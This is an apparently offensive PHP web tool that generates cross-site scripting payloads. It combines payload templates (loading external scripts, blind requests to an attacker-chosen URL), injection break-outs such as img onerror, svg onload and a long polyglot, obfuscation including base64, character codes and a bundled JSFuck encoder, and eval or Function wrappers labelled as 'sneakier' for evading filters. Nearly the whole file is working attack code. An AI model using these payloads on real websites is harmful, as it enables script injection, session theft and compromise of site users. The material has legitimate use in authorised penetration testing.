<?php
  /**
    XSS Payload generator and dropper
  */


  /**
    Payload types
      - Request URL (img)
      - Request URL (XHR)
      - Load script ($.getScript())
      - Load script (document.createElement())
      - Dropper (multiple scripts / automatic payload)
      - JavaScript code

  */

  $aPayloads = [
    [
      "name" => "Load script ($.getScript())",
      "desc" => "Load an external script into the DOM using jQuery, if jQuery is already loaded into the DOM",
      "code" => "$.getScript(\"{url}\")",
      "fields" => "filepicker,url"
    ],
    [
      "name" => "Load script (document.createElement())",
      "desc" => "Load an external script into the DOM using native document.createElement() methods",
      "code" => "e=document.createElement(\"script\");e.src=\"{url}\";document.body.appendChild(e);",
      "fields" => "filepicker,url"
    ],
    [
      "name" => "Request URL (img)",
      "desc" => "Make a blind, cross-origin request to an arbitrary URL (tip: use a Burp collaborator URL)",
      "code" => "new Image().src=\"{url}\"",
      "fields" => "url"
    ],
    [
      "name" => "Request URL (XHR)",
      "desc" => "Make a same-origin or CORS request to an arbitrary URL",
      "code" => "x=new XMLHttpRequest();x.open(\"GET\",\"{url}\");x.send()",
      "fields" => "url"
    ],
    [
      "name" => "JavaScript code",
      "desc" => "Inject custom inline JavaScript code",
      "code" => "{js}",
      "fields" => "js"
    ]
    /*
    [
      "name" => "Dropper (multiple scripts / automatic payload)",
      "desc" => "Load a set of scripts using this dropper to determine the best payload",
      "code" => ""
    ],
    */
  ];
  
  /*
    Obfuscation
      - None
      - base64 (btoa())
      - reverse
      - String.fromCharCode()
      - character hex code
  */
  $aObfuscation = [
    [
      "name" => "None",
      "desc" => "No obfuscation",
      "code" => "{payload}"
    ],
    [
      "name" => "Pass as string",
      "desc" => "Pass the payload as a string into an execution method",
      "code" => "'{payload}'"
    ],
    [
      "name" => "Base64 (atob())",
      "desc" => "Base64 encode",
      "code" => "atob('{payloadb64}')"
    ],
    [
      "name" => "Reverse",
      "desc" => "Reverse payload string and execute using eval()",
      "code" => "'{payloadrev}'.split('').reverse().join('')"
    ],
    [
      "name" => "String.fromCharCode()",
      "desc" => "Build payload string one char at a time using the ordinal value",
      "code" => "{payloadchr}"
    ],
    [
      "name" => "Character hex codes",
      "desc" => "Construct the payload using hex value of each character",
      "code" => "'{payloadhex}'"
    ],
    [
      "name" => "JSF*ck",
      "desc" => "Encode payload using only the characters []()!+",
      "code" => "{payloadjsf}"
    ]
  ];

  $aExecution = [
    [
      "name" => "None",
      "desc" => "No execution required",
      "code" => "{obfuscated}"
    ],
    [
      "name" => "eval()",
      "desc" => "Pass string to eval() function",
      "code" => "eval({obfuscated})"
    ],
    [
      "name" => "window['eval']()",
      "desc" => "Slightly sneakier way of calling eval()",
      "code" => "window['eval']({obfuscated})"
    ],
    [
      "name" => "window['\\x65\\x76\\x61\\x6c']()",
      "desc" => "Even sneakier way of calling eval()",
      "code" => "window['\\x65\\x76\\x61\\x6c']({obfuscated})"
    ],
    [
      "name" => "Function()()",
      "desc" => "Declare and execute an anonymous function",
      "code" => "Function({obfuscated})()"
    ],
    [
      "name" => "window['Function']()()",
      "desc" => "Slightly sneakier way of creating a new anonymous function",
      "code" => "window['Function']({obfsucated})()"
    ],
    [
      "name" => "window['\\x46\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e']()()",
      "desc" => "Even sneakier way of creating a new anonymous function",
      "code" => "window['\\x46\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e']({obfuscated})()"
    ],
    [
      "name" => "setTimeout()",
      "desc" => "Pass code string to the setTimeout() function",
      "code" => "setTimeout({obfuscated},0)"
    ],
    [
      "name" => "window['setTimeout']()",
      "desc" => "Slightly sneakier way of calling the setTimeout() function",
      "code" => "window['setTimeout']({obfuscated},0)"
    ],
    [
      "name" => "window['\\x73\\x65\\x74\\x54\\x69\\x6d\\x65\\x6f\\x75\\x74']()",
      "desc" => "Even sneakier way of calling the setTimeout() function",
      "code" => "window['\\x73\\x65\\x74\\x54\\x69\\x6d\\x65\\x6f\\x75\\x74']({obfuscated},0)"
    ]
  ];
  
  /*
    Injection
      - Basic polyglot / inline script
      - 0xsobky - Ultimate XSS Polyglot
      - String variable escape
      - img element onerror
      - SVG element
      - Element onclick
      - Element onmouseover
  */
  $aInjections = [
    [
      "name" => "Basic polyglot / inline script",
      "desc" => "Code execution using basic break-out technique",
      "code" => "'\"></textarea><script>{payload}</script>"
    ],
    [
      "name" => "0xsobky - Ultimate XSS Polyglot",
      "desc" => "Long, very flexible payload good for blind injection and fuzzing",
      "code" => "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk={payload} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={payload}//>\\x3e"
    ],
    [
      "name" => "String variable escape",
      "desc" => "Break out from within a string in block of JavaScript",
      "code" => "\";//';\n{payload}"
    ],
    [
      "name" => "img element onerror",
      "desc" => "Inject an invalid <img> element with the payload within onerror",
      "code" => "<img src=x onerror={payload} />"
    ],
    [
      "name" => "SVG element",
      "desc" => "Inject an SVG element containing the payload within onload",
      "code" => "<svg onload={payload} />"
    ],
    [
      "name" => "Element onclick",
      "desc" => "Break out of an element attribute and add an onclick event",
      "code" => "'\" onclick={payload} >"
    ],
    [
      "name" => "Element onmouseover",
      "desc" => "Break out of an element attribute and add an onmouseover event",
      "code" => "'\" onmouseover={payload} >"
    ],
    [
      "name" => "Custom element and event",
      "desc" => "Define an element and an event to execute the payload",
      "code" => "<{element}/{event}={payload} />",
      "fields" => "element,event"
    ]
  ];

  $aElements = [
    "a",
    "abbr",
    "acronym",
    "address",
    "applet",
    "area",
    "article",
    "aside",
    "audio",
    "b",
    "base",
    "basefont",
    "bdi",
    "bdo",
    "big",
    "blockquote",
    "body",
    "br",
    "button",
    "canvas",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "data",
    "datalist",
    "dd",
    "del",
    "details",
    "dfn",
    "dialog",
    "dir",
    "div",
    "dl",
    "dt",
    "em",
    "embed",
    "fieldset",
    "figcaption",
    "figure",
    "font",
    "footer",
    "form",
    "frame",
    "frameset",
    "h1 to h6",
    "head",
    "header",
    "hr",
    "html",
    "i",
    "iframe",
    "img",
    "input",
    "ins",
    "kbd",
    "label",
    "legend",
    "li",
    "link",
    "main",
    "map",
    "mark",
    "meta",
    "meter",
    "nav",
    "noframes",
    "noscript",
    "object",
    "ol",
    "optgroup",
    "option",
    "output",
    "p",
    "param",
    "picture",
    "pre",
    "progress",
    "q",
    "rp",
    "rt",
    "ruby",
    "s",
    "samp",
    "script",
    "section",
    "select",
    "small",
    "source",
    "span",
    "strike",
    "strong",
    "style",
    "sub",
    "summary",
    "sup",
    "svg",
    "table",
    "tbody",
    "td",
    "template",
    "textarea",
    "tfoot",
    "th",
    "thead",
    "time",
    "title",
    "tr",
    "track",
    "tt",
    "u",
    "ul",
    "var",
    "video",
    "wbr"
  ];

  $aEvents = [
    "onabort",
    "oncancel",
    "onblur",
    "oncanplay",
    "oncanplaythrough",
    "onchange",
    "onclick",
    "oncontextmenu",
    "ondblclick",
    "ondrag",
    "ondragend",
    "ondragenter",
    "ondragexit",
    "ondragleave",
    "ondragover",
    "ondragstart",
    "ondrop",
    "ondurationchange",
    "onemptied",
    "onended",
    "onerror",
    "onfocus",
    "onformchange",
    "onforminput",
    "oninput",
    "oninvalid",
    "onkeydown",
    "onkeypress",
    "onkeyup",
    "onload",
    "onloadeddata",
    "onloadedmetadata",
    "onloadstart",
    "onmousedown",
    "onmousemove",
    "onmouseout",
    "onmouseover",
    "onmouseup",
    "onmousewheel",
    "onpause",
    "onplay",
    "onplaying",
    "onprogress",
    "onratechange",
    "onreadystatechange",
    "onscroll",
    "onseeked",
    "onseeking",
    "onselect",
    "onshow",
    "onstalled",
    "onsubmit",
    "onsuspend",
    "ontimeupdate",
    "onvolumechange",
    "onwaiting"
  ];
  
  // JSFuck: http://www.jsfuck.com/
  // JSFuck PHP port: https://github.com/Zaczero/jsfuck.php
  class JSFuck {

      private const MIN = 32;
      private const MAX = 126;
      private const USE_CHAR_CODE = 'USE_CHAR_CODE';

      private const SIMPLE = [
          'false' => '![]',
          'true' => '!![]',
          'undefined' => '[][[]]',
          'NaN' => '+[![]]',
          'Infinity' => '+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])',
      ];

      private const CONSTRUCTORS = [
          'Array' => '[]',
          'Number' => '(+[])',
          'String' => '([]+[])',
          'Boolean' => '(![])',
          'RegExp' => 'Function("return/"+false+"/")()',
          'Function' => '[]["fill"]',
      ];

      private $_MAPPING = [
          'a' => '(false+"")[1]',
          'b' => '([]["entries"]()+"")[2]',
          'c' => '([]["fill"]+"")[3]',
          'd' => '(undefined+"")[2]',
          'e' => '(true+"")[3]',
          'f' => '(false+"")[0]',
          'g' => '(false+[0]+String)[20]',
          'h' => '(+(101))["to"+String["name"]](21)[1]',
          'i' => '([false]+undefined)[10]',
          'j' => '([]["entries"]()+"")[3]',
          'k' => '(+(20))["to"+String["name"]](21)',
          'l' => '(false+"")[2]',
          'm' => '(Number+"")[11]',
          'n' => '(undefined+"")[1]',
          'o' => '(true+[]["fill"])[10]',
          'p' => '(+(211))["to"+String["name"]](31)[1]',
          'q' => '(+(212))["to"+String["name"]](31)[1]',
          'r' => '(true+"")[1]',
          's' => '(false+"")[3]',
          't' => '(true+"")[0]',
          'u' => '(undefined+"")[0]',
          'v' => '(+(31))["to"+String["name"]](32)',
          'w' => '(+(32))["to"+String["name"]](33)',
          'x' => '(+(101))["to"+String["name"]](34)[1]',
          'y' => '(NaN+[Infinity])[10]',
          'z' => '(+(35))["to"+String["name"]](36)',
          
          'A' => '(+[]+Array)[10]',
          'B' => '(+[]+Boolean)[10]',
          'C' => 'Function("return escape")()(("")["italics"]())[2]',
          'D' => 'Function("return escape")()([]["fill"])["slice"]("-1")',
          'E' => '(RegExp+"")[12]',
          'F' => '(+[]+Function)[10]',
          'G' => '(false+Function("return Date")()())[30]',
          'H' => JSFuck::USE_CHAR_CODE,
          'I' => '(Infinity+"")[0]',
          'J' => JSFuck::USE_CHAR_CODE,
          'K' => JSFuck::USE_CHAR_CODE,
          'L' => JSFuck::USE_CHAR_CODE,
          'M' => '(true+Function("return Date")()())[30]',
          'N' => '(NaN+"")[0]',
          'O' => '(NaN+Function("return{}")())[11]',
          'P' => JSFuck::USE_CHAR_CODE,
          'Q' => JSFuck::USE_CHAR_CODE,
          'R' => '(+[]+RegExp)[10]',
          'S' => '(+[]+String)[10]',
          'T' => '(NaN+Function("return Date")()())[30]',
          'U' => '(NaN+Function("return{}")()["to"+String["name"]]["call"]())[11]',
          'V' => JSFuck::USE_CHAR_CODE,
          'W' => JSFuck::USE_CHAR_CODE,
          'X' => JSFuck::USE_CHAR_CODE,
          'Y' => JSFuck::USE_CHAR_CODE,
          'Z' => JSFuck::USE_CHAR_CODE,
          
          ' ' => '(NaN+[]["fill"])[11]',
          '!' => JSFuck::USE_CHAR_CODE,
          '"' => '("")["fontcolor"]()[12]',
          '#' => JSFuck::USE_CHAR_CODE,
          '$' => JSFuck::USE_CHAR_CODE,
          '%' => 'Function("return escape")()([]["fill"])[21]',
          '&' => '("")["link"](0+")[10]',
          '\'' => JSFuck::USE_CHAR_CODE,
          '(' => '(undefined+[]["fill"])[22]',
          ')' => '([0]+false+[]["fill"])[20]',
          '*' => JSFuck::USE_CHAR_CODE,
          '+' => '(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[2]',
          ',' => '([]["slice"]["call"](false+"")+"")[1]',
          '-' => '(+(.+[0000000001])+"")[2]',
          '.' => '(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]',
          '/' => '(false+[0])["italics"]()[10]',
          ':' => '(RegExp()+"")[3]',
          ';' => '("")["link"](")[14]',
          '<' => '("")["italics"]()[0]',
          '=' => '("")["fontcolor"]()[11]',
          '>' => '("")["italics"]()[2]',
          '?' => '(RegExp()+"")[2]',
          '@' => JSFuck::USE_CHAR_CODE,
          '[' => '([]["entries"]()+"")[0]',
          '\\' => JSFuck::USE_CHAR_CODE,
          ']' => '([]["entries"]()+"")[22]',
          '^' => JSFuck::USE_CHAR_CODE,
          '_' => JSFuck::USE_CHAR_CODE,
          '`' => JSFuck::USE_CHAR_CODE,
          '{' => '(true+[]["fill"])[20]',
          '|' => JSFuck::USE_CHAR_CODE,
          '}' => '([]["fill"]+"")["slice"]("-1")',
          '~' => JSFuck::USE_CHAR_CODE,
      ];

      private const GLOBAL = 'Function("return this")()';

      public function __construct(string $compilePath = "jsfuck.data") {
          if(file_exists($compilePath)) {
              $data = file_get_contents("jsfuck.data");
              $this->_MAPPING = unserialize($data);
          }
          else {
              $this->FillMissingChars();
              $this->FillMissingDigits();
              $this->ReplaceMap();
              $this->ReplaceStrings();

              $data = serialize($this->_MAPPING);
              file_put_contents("jsfuck.data", $data);
          }
      }

      public function Encode(string $input, bool $wrapWithEval = false, bool $runInParentScope = false) : string {
          $output = [];
          
          $r = "";
          foreach(JSFuck::SIMPLE as $i => $val) {
              $r .= "$i|";
          }
          $r .= ".";

          if(preg_match_all("/$r/", $input, $matches)) {
              foreach($matches[0] as $find) {
                  if(key_exists($find, JSFuck::SIMPLE)) {
                      $output[] = "[".JSFuck::SIMPLE[$find]."]+[]";
                  }
                  else if(key_exists($find, $this->_MAPPING)) {
                      $output[] = $this->_MAPPING[$find];
                  }
                  else {
                      $replacement = "([]+[])[".$this->Encode("constructor")."][".$this->Encode("fromCharCode")."](".$this->Encode((string) ord($find)).")";
                      $output[] = $replacement;
                      $this->_MAPPING[$find] = $replacement;
                  }
              }
          }

          $output = join("+", $output);

          if(preg_match("/^\d$/", $input)) {
              $output .= "+[]";
          }

          if($wrapWithEval) {
              if($runInParentScope) {
                  $output = "[][".$this->Encode("fill")."][".$this->Encode("constructor")."](".$this->Encode("return eval").")()($output)";
              }
              else {
                  $output = "[][".$this->Encode("fill")."][".$this->Encode("constructor")."]($output)()";
              }
          }

          return $output;
      }

      private function FillMissingChars() {
          foreach($this->_MAPPING as $key => $value) {
              if($value === JSFuck::USE_CHAR_CODE) {
                  $charCode = ord($key);
                  $charCodeHex = dechex($charCode);
                  $replace = preg_replace('/(\d+)/', '+($1)+"', $charCodeHex);
                  $this->_MAPPING[$key] = 'Function("return unescape")()("%"'.$replace.'")';
              }
          }
      }

      private function FillMissingDigits() {
          for($number = 0; $number < 10; $number++) {
              $output = "+[]";

              if($number > 0) {
                  $output = "+!$output";
              }

              for($i = 1; $i < $number; $i++) {
                  $output = "+!+[]$output";
              }

              if($number > 1) {
                  $output = substr($output, 1);
              }

              $this->_MAPPING[$number] = "[$output]";
          }
      }

      private function ReplaceMap() {
          for($i = JSFuck::MIN; $i <= JSFuck::MAX; $i++) {
              $char = chr($i);
              $value = $this->_MAPPING[$char];

              if(empty($value)) {
                  continue;
              }

              foreach(JSFuck::CONSTRUCTORS as $key => $val) {
                  $value = preg_replace("/\b$key/", $val.'["constructor"]', $value);
              }

              foreach(JSFuck::SIMPLE as $key => $val) {
                  $value = preg_replace("/$key/", $val, $value);
              }

              $value = $this->NumberReplacer($value, "/(\d\d+)/i");
              $value = $this->DigitReplacer($value, "/\((\d)\)/i");
              $value = $this->DigitReplacer($value, "/\[(\d)\]/i");

              $value = preg_replace("/GLOBAL/", JSFuck::GLOBAL, $value);
              $value = preg_replace("/\+\"\"/", "+[]", $value);
              $value = preg_replace("/\"\"/", "[]+[]", $value);

              $this->_MAPPING[$char] = $value;
          }
      }

      private function ReplaceStrings() {
          foreach($this->_MAPPING as $key => $value) {
              $this->_MAPPING[$key] = $this->MappingReplacer((string) $value, "/\"([^\"]+)\"/i");
          }

          $count = JSFuck::MAX - JSFuck::MIN;

          while(true) {
              $missing = $this->FindMissing();

              if(count($missing) == 0) {
                  break;
              }
              
              foreach($missing as $key => $value) {
                  $value = $this->ValueReplacer($value, "/[^\[\]\(\)\!\+]{1}/", $missing);
                  $this->_MAPPING[$key] = $value;
              }
              
              if($count-- === 0) {
                  throw new Exception("Could not compile the following chars: ".json_encode($this->FindMissing()));
              }
          }
      }

      private function FindMissing() : array {
          $missing = [];
          foreach($this->_MAPPING as $key => $value) {
              if(preg_match("/[^\[\]\(\)\!\+]{1}/", $value)) {
                  $missing[$key] = $value;
              }
          }
          return $missing;
      }

      private function NumberReplacer(string $value, string $pattern) : string {
          if(preg_match_all($pattern, $value, $matches, PREG_OFFSET_CAPTURE)) {
              for($i = count($matches[0]) - 1; $i >= 0; $i--) {
                  $find = $matches[0][$i][0];
                  $offs = $matches[0][$i][1];
      
                  $begin = substr($value, 0, $offs);
                  $end = substr($value, $offs + strlen($find));
      
                  $values = [];
                  for($j = 0; $j < strlen($find); $j++) {
                      $values[$j] = $find[$j];
                  }
      
                  $head = (int) array_shift($values);
                  $output = "+[]";
      
                  if($head > 0) {
                      $output = "+!$output";
                  }
      
                  for($j = 1; $j < $head; $j++) {
                      $output = "+!+[]$output";
                  }
      
                  if($head > 1) {
                      $output = substr($output, 1);
                  }
      
                  $merged = array_merge([$output], $values);
                  $joined = join("+", $merged);
                  
                  $value = $begin.$this->DigitReplacer($joined, "/(\d)/").$end;
              }
          }

          return $value;
      }

      private function DigitReplacer(string $value, string $pattern) : string {
          if(preg_match_all($pattern, $value, $matches, PREG_OFFSET_CAPTURE)) {
              for($i = count($matches[1]) - 1; $i >= 0; $i--) {
                  $find = $matches[1][$i][0];
                  $offs = $matches[1][$i][1];
      
                  $begin = substr($value, 0, $offs);
                  $end = substr($value, $offs + strlen($find));
      
                  $value = $begin.$this->_MAPPING[$find].$end;
              }
          }

          return $value;
      }

      private function MappingReplacer(string $value, string $pattern) : string {
          if(preg_match_all($pattern, $value, $matches, PREG_OFFSET_CAPTURE)) {
              for($i = count($matches[1]) - 1; $i >= 0; $i--) {
                  $find = $matches[1][$i][0];
                  $offs = $matches[1][$i][1];
      
                  $begin = substr($value, 0, $offs - 1);
                  $end = substr($value, $offs + strlen($find) + 1);
      
                  $values = [];
                  for($j = 0; $j < strlen($find); $j++) {
                      $values[$j] = $find[$j];
                  }

                  $value = $begin.join("+", $values).$end;
              }
          }

          return $value;
      }

      private function ValueReplacer(string $value, string $pattern, array $missing) : string {
          if(preg_match_all($pattern, $value, $matches, PREG_OFFSET_CAPTURE)) {
              for($i = count($matches[0]) - 1; $i >= 0; $i--) {
                  $find = $matches[0][$i][0];
                  $offs = $matches[0][$i][1];
      
                  $begin = substr($value, 0, $offs);
                  $end = substr($value, $offs + strlen($find));

                  if(!key_exists($find, $missing)) {
                      $value = $begin.$this->_MAPPING[$find].$end;
                  }
                  else {
                      $value = $value;
                  }
              }
          }

          return $value;
      }

  }


  // Logic for generating a payload
  function generatePayload( $form ){
    global $aPayloads, $aObfuscation, $aExecution, $aInjections;
    $required = ['payloadid','injectionid','obfuscationid','executionid'];
    foreach( $required as $item ){
      if( !in_array( $item, array_keys( $form ) ) ) return $item." not provided";
    }

    $rtn = [];
    $rtn['meta'] = [];
    if( !in_array( $form['payloadid'], array_keys( $aPayloads ) ) ) $form['payloadid'] = 0;
    $payload = $aPayloads[$form['payloadid']];
    $rtn['meta']['payload'] = $payload;

    // Replace values in code with form values
    $fields = explode( ",", $payload["fields"] );
    $code = $payload['code'];
    foreach( $fields as $f ){
      if( !in_array( $f, array_keys( $form ) ) ) continue;
      $code = str_replace( '{'.$f.'}', $form[$f], $code );
    }
    $rtn['payload'] = $code;

    // Prepare payloads
    $prep = [];
    $prep['payload'] = $code;
    $prep['payloadb64'] = base64_encode( $code );
    $prep['payloadrev'] = strrev( $code );
    $chrs = [];
    for( $i=0; $i<strlen($code); $i++ ){
      $chrs[] = ord( substr( $code, $i, 1 ) );
    }
    $prep['payloadchr'] = 'String.fromCharCode(' . implode( ',', $chrs ) . ')';
    $hex = '';
    for ($i = 0; $i < strlen($code); $i++) {
      $hex .= '\x' . str_pad(dechex(ord($code[$i])), 2, '0', STR_PAD_LEFT);
    }
    $prep['payloadhex'] = $hex;
    $jsf = new JSFuck();
    $prep['payloadjsf'] = $jsf->Encode($code);
    $rtn['prepared'] = $prep;

    // Obfuscate code using chosen method
    if( !in_array( $form['obfuscationid'], array_keys( $aObfuscation ) ) ) $form['obfuscationid'] = 0;
    $obfuscation = $aObfuscation[$form['obfuscationid']];
    $rtn['meta']['obfuscation'] = $obfuscation;
    $code = $obfuscation['code']; 
    foreach( $prep as $k => $v ){
      $code = str_replace( '{'.$k.'}', $v, $code );
    }
    $rtn['obfuscated'] = $code;

    // Add into execution method
    if( !in_array( $form['executionid'], array_keys( $aExecution ) ) ) $form['executionid'] = 0;
    $execution = $aExecution[$form['executionid']];
    $rtn['meta']['execution'] = $execution;
    $code = str_replace( '{obfuscated}', $rtn['obfuscated'], $execution['code'] );
    $rtn['execute'] = $code;

    // Insert into injection string
    if( !in_array( $form['injectionid'], array_keys( $aInjections ) ) ) $form['injectionid'] = 0;
    $injection = $aInjections[$form['injectionid']];
    $rtn['meta']['injection'] = $injection;
    $code = str_replace( '{payload}', $code, $injection['code'] );
   
    // Custom injection
    if( array_key_exists( 'fields', $injection ) ){
      $fields = explode( ",", $injection["fields"] );
      
      foreach( $fields as $f ){
        if( !in_array( $f, array_keys( $form ) ) ) continue;
        $code = str_replace( '{'.$f.'}', $form[$f], $code );
      }
    }
    $rtn['payload'] = $code;
    $rtn['inject'] = $code;
    return $rtn;
  }

  // Generate the actual payload
  if( $_GET['mode'] == 'ajax' ){
    header('Content-Type: text/json');
    $rtn = generatePayload( $_GET );
    echo json_encode( $rtn );
    exit;
  }
  
  // Show form to generate a payload
  if( empty( $_GET["mode"] ) || $_GET["mode"] == "generate"){
?>
<html>
<head>
<title>XSS Payload Generator</title>
<script>
function createPayload(){
  ids = 'payloadid,obfuscationid,executionid,injectionid'.split(',');
  var args = '';
  opts = [];
  for( var i=0; i<ids.length; i++ ){
    k = ids[i];
    e = document.getElementById(k);
    opts[k] = e.options[e.selectedIndex].value;
  }
  inp = document.getElementsByClassName('container');
  for( var i=0; i<inp.length; i++ ){
    inp[i].style.display = 'None';
    // console.log(inp[i]);  
  }
  switch( opts['payloadid'] ){
<?php
  foreach( $aPayloads as $id => $p ){
    echo "    case '$id':\n";
    $fields = explode( ',', $p['fields'] );
    foreach( $fields as $f ){
      echo "      f = document.getElementById('$f')\n";
      echo "      if( f.tagName == 'SELECT' ) opts['$f'] = f.options[f.selectedIndex].value;\n";
      echo "      else opts['$f'] = f.value;\n";
      echo "      e = document.getElementById('".$f."_container');\n";
      echo "      e.style.display = 'block';\n";
    }
    echo "      break;\n";
  }
?>
  }
  switch( opts['injectionid'] ){
<?php
  foreach( $aInjections as $id => $inj ){
    if( array_key_exists( 'fields', $inj ) ){
      echo "    case '$id':\n";
      $fields = explode( ',', $inj['fields'] );
      foreach( $fields as $f ){
        echo "      f = document.getElementById('$f')\n";
        echo "      if( f.tagName == 'SELECT' ) opts['$f'] = f.options[f.selectedIndex].value;\n";
        echo "      else opts['$f'] = f.value;\n";
        echo "      e = document.getElementById('".$f."_container');\n";
        echo "      e.style.display = 'block';\n";
        echo "      console.log('show', e);\n";
      }
      echo "      break;\n";
    }
  }
?>
  }
  url = "<?php echo $_SERVER["PHP_SELF"]; ?>?mode=ajax";
  for( var k in opts ){
    arg = "&" + k + "=" + opts[k]; 
    url = url + arg
  }
  x = new XMLHttpRequest();
  x.onreadystatechange = function(){
    if( x.readyState == 4 && x.status == 200 ){
      console.log( x.responseText );
      data = JSON.parse( x.responseText );
      document.getElementById('output').value = data['inject'];
      document.getElementById('payload_desc').innerText = data['meta']['payload']['desc'];
      document.getElementById('injection_desc').innerText = data['meta']['injection']['desc'];
      document.getElementById('obfuscation_desc').innerText = data['meta']['obfuscation']['desc'];
      document.getElementById('execution_desc').innerText = data['meta']['execution']['desc'];
    }
  }
  x.open('GET',url);
  x.send();
}
function setUrl(){
  f = document.getElementById('filepicker');
  u = document.getElementById('url');
  u.value = f.options[f.selectedIndex].value;
  u.onchange();
}
function initForm(){
  tags = "input,select".split(',');
  console.log( tags );
  for(var j=0; j<tags.length; j++){
    opts = document.getElementsByTagName(tags[j]);
    for( var i=0; i<opts.length; i++ ){
      console.log(opts[i]);
      opts[i].onchange = createPayload;
    }
  }
  document.getElementById('filepicker').onchange = setUrl;
  createPayload();
}
window.onload = initForm;
</script>
<style>
  body {
    font-family: Trebuchet, sans-serif;
  }
  label {
    display: block;
    margin-top: 1em;
  }
  textarea {
    width: 50em;
    height: 30em;
  }
  select, input {
    width: 50em;
  }
  div.desc {
    font-size: 80%;
  }
</style>
</head>
<body>
<h1>XSS Payload Generator</h1>
<form>
  <div>
    <label for="payloadid">Payload</label>
    <select id="payloadid">
<?php
  foreach( $aPayloads as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="payload_desc" class="desc"></div>
  </div>
  <div id="filepicker_container" class="container">
    <label for="filepicker">Built-in script</label>
    <select id="filepicker">
      <option value=""></option>
<?php
  $baseurl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI']);
  foreach( scandir('.') as $f ){
    if( !preg_match( "/\.(php|js)$/", $f ) ) continue;
    echo "      <option value=\"".$baseurl."/".$f."\">$f</option>\n";
  }
?>
    </select>
  </div>
  <div id="url_container" class="container">
    <label for="url">URL:</label>
    <input type="text" id="url"/>
  </div>
  <div id="js_container" class="container">
    <label for="js">Custom Payload:</label>
    <input type="text" id="js" value="alert('I only write lame PoCs')"/>
  </div>
  <div>
    <label for="obfuscationid">Obfuscation</label>
    <select id="obfuscationid">
<?php
  foreach( $aObfuscation as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="obfuscation_desc" class="desc"></div>
  </div>
  <div>
    <label for="executionid">Execution</label>
    <select id="executionid">
<?php
  foreach( $aExecution as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="execution_desc" class="desc"></div>
  </div>
  <div>
    <label for="injectionid">Injection type</label>
    <select id="injectionid">
<?php
  foreach( $aInjections as $id => $item ){
    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
  }
?>
    </select>
    <div id="injection_desc" class="desc"></div>
  </div>
  <div class="container" id="element_container">
    <label for="element">HTML Element</label>
    <select id="element">
<?php
  foreach( $aElements as $el ){
    echo "      <option value=\"$el\">" . $el. "</option>\n";
  }
?>
    </select>
    <div id="element_desc" class="desc"></div>
  </div>
  <div class="container" id="event_container">
    <label for="event">HTML Event</label>
    <select id="event">
<?php
  foreach( $aEvents as $ev ){
    echo "      <option value=\"$ev\">" . $ev . "</option>\n";
  }
?>
    </select>
    <div id="event_desc" class="desc"></div>
  </div>
  <div>
    <label for="output">Output</label>
    <textarea id="output"></textarea>
  </div>
</form>

<?php
  }
?>
